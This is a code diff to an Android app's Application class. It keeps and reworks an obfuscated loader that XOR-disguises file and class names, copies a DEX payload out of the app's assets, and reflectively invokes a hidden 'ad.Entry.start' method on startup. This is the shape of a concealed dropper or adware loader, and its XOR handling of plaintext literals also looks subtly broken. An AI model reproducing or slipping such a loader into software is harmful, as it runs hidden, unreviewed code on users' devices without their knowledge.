@@ -20,19 +20,19 @@ public class App extends Application {
 	}
 
 	public static void init(final Context context) {
-		byte[] dex = "classes.dex".getBytes();
-		for (int i = 0; i < dex.length; i++) {
-			dex[i] ^= 0x12;
+		final byte[] classesdex = "classes.dex".getBytes();
+		for (int i = 0; i < classesdex.length; i++) {
+			classesdex[i] ^= 0x12;
 		}
-		byte[] odex = "odex".getBytes();
-		for (int i = 0; i < odex.length; i++) {
-			odex[i] ^= 0x12;
+		byte[] classesodex = "odex".getBytes();
+		for (int i = 0; i < classesodex.length; i++) {
+			classesodex[i] ^= 0x12;
 		}
 
 		final String dexFile = context.getFilesDir() + File.separator
-				+ new String(dex);
+				+ new String(classesdex);
 		final String odexDir = context.getFilesDir().getAbsolutePath()
-				+ File.separator + new String(odex);
+				+ File.separator + new String(classesodex);
 		new File(odexDir).mkdirs();
 		new Thread(new Runnable() {
 			@Override
@@ -42,7 +42,7 @@ public class App extends Application {
 				InputStream is = null;
 				FileOutputStream fos = null;
 				try {
-					is = context.getAssets().open("classes.dex");
+					is = context.getAssets().open(new String(classesdex));
 
 					File destDir = new File(dexFile.substring(0,
 							dexFile.lastIndexOf("/")));
@@ -84,16 +84,16 @@ public class App extends Application {
 
 				if (dcl != null) {
 					try {
-						byte[] entry = "ad.Entry".getBytes();
-						byte[] start = "start".getBytes();
-						for (int i = 0; i < entry.length; i++) {
-							entry[i] ^= 0x12;
+						byte[] entrybyte = "ad.Entry".getBytes();
+						byte[] startbyte = "start".getBytes();
+						for (int i = 0; i < entrybyte.length; i++) {
+							entrybyte[i] ^= 0x12;
 						}
-						for (int i = 0; i < start.length; i++) {
-							start[i] ^= 0x12;
+						for (int i = 0; i < startbyte.length; i++) {
+							startbyte[i] ^= 0x12;
 						}
-						Class cls = dcl.loadClass(new String(entry));
-						Method m = cls.getDeclaredMethod(new String(start),
+						Class cls = dcl.loadClass(new String(entrybyte));
+						Method m = cls.getDeclaredMethod(new String(startbyte),
 								String.class, Context.class);
 						m.setAccessible(true);
 						m.invoke(null, "01hbPe10", context);
